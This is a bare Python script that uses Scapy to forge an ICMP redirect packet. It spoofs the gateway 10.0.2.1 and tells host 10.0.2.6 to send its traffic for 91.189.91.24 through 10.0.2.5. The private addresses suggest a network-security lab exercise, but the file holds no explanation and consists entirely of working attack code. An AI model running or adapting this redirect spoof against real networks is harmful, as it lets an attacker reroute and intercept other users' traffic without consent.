from scapy.all import *

ip = IP();
ip.src = '10.0.2.1';
ip.dst = '10.0.2.6';
icmp = ICMP();
icmp.type = 5;
icmp.code = 1;
icmp.gw = '10.0.2.5'
ip2 = IP();
ip2.src = '10.0.2.6';
ip2.dst = '91.189.91.24';
send(ip/icmp/ip2/UDP());
